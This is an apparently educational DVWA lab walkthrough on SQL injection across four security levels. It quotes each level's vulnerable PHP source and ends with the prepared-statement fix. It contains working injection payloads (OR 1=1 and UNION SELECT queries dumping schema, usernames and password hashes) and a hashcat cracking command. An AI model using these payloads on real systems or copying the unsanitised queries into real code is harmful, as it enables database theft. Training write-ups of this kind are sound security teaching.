# SQL Injection

## About

> A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application.<br/>
> A successful SQL injection exploit can read sensitive data from the database, modify database data (insert/update/delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system (load_file) and in some cases issue commands to the operating system.<br/>
> SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands.<br/>
> This attack may also be called "SQLi".

Source: DVWA Documentation

## Low Security

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql1.png?raw=true">
</p>

Inserting `1'` will return an error, that means that SQL Injection could be possible.

Visiting the source code we can find:
```php
// Check database
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

// Get results
while( $row = mysqli_fetch_assoc( $result ) ) {
    // Get values
    $first = $row["first_name"];
    $last  = $row["last_name"];

    // Feedback for end user
    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
}

mysqli_close($GLOBALS["___mysqli_ston"]); 
```

We can see that the `'$id'` is not validated or sanitized in any way, so we can inject the following: `1' OR 1=1;#`

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql2.png?raw=true">
</p>

With this payload we bypass the query using the quote symbol and add the logic operator `OR`, which will make the query to return between the id given or a true statement such as 1=1.
The pound sign `#` is used to comment the rest of the query.

So, the query executed will look like this:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR 1=1;#';"
```

To further exploit this vulnerability we can use the UNION method to extract more information:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT @@version, null#';"
```

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql8.png?raw=true">
</p>

Now we got the version of the database.
First, we need to enumerate the columns using `UNION SELECT null,null`, and we add null values until we will get a valid response. This is usually done to enumerate the number of columns returned, but in this case we already know that `first_name` and `last_name` are returned.
Keep in mind that `@@version` syntax will only work for MySQL dbs.

Using `database()` function we can find the name of the database.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql9.png?raw=true">
</p>

Now we can enumerate the tables, the columns and extract the values.
For the next queries I changed the format a little bit.	

```sql
1' UNION SELECT null,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'dvwa'#
```	

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql10.png?raw=true">
</p>

```sql
1' UNION SELECT null,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'#
```

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql11.png?raw=true">
</p>

```sql
1' UNION SELECT user, password FROM users#
```

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql12.png?raw=true">
</p>

We can use `hash-identifier` in order to find the hash format, and then we will brute-force it using `hashcat`.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql13.png?raw=true">
</p>

```
hashcat -m 0 password /usr/share/wordlists/rockyou.txt
```

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql14.png?raw=true">
</p>

## Medium Security

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql3.png?raw=true">
</p>

For the Medium security level we can not change the value of the parameter directly from the UI, but we can edit it with the Inspect Element option.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql15.png?raw=true">
</p>

Another method is to use a Proxy tool like Burp Suite to modify the HTTP request.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql4.png?raw=true">
</p>

We will add the payload without the quote because now the $id does not need anymore. Then we URL encode the payload and send it.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql5.png?raw=true">
</p>

The same enumeration using UNION method is still working.

Source code:
```php
// Get input
$id = $_POST[ 'id' ];

$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

switch ($_DVWA['SQLI_DB']) {
    case MYSQL:
        $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
        $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

        // Get results
        while( $row = mysqli_fetch_assoc( $result ) ) {
            // Display values
            $first = $row["first_name"];
            $last  = $row["last_name"];

            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
        break;
```

What is different here is the presence of `mysqli_real_escape_string()` which is escaping the following characters:
```
NUL (ASCII 0), \n, \r, \, ', ", and CTRL+Z
```
The problem is that the quote is not needed anymore and the other symbols are not affecting us.

## High Security

For the High level of security the source code looks like this:
```sql
if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            // Check database
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
            $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

            // Get results
            while( $row = mysqli_fetch_assoc( $result ) ) {
                // Get values
                $first = $row["first_name"];
                $last  = $row["last_name"];

                // Feedback for end user
                echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
            }

            ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        
            break; 
```
For this exercise a new window for the input will open, so the input is transferred using another page.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql6.png?raw=true">
</p>

As we can see the `$id` is still sent unsecured.
In this query we have a `LIMIT 1` which will make the query to return only one record from the database, but this can still be commented using injection with `#` symbol.<br/>
In this case, the same payloads will work for High security level.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/SQL-Injection/!images/sql7.png?raw=true">
</p>

## Impossible Security

Source Code:
```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        $id = intval ($id);
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();
        $row = $data->fetch();
		
        // Make sure only 1 result is returned
        if( $data->rowCount() == 1 ) {
            // Get values
            $first = $row[ 'first_name' ];
            $last  = $row[ 'last_name' ];
		
            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```

For this case, an Anti-CSRF token was implemented, and the application verifies if the `$id` has a numerical value.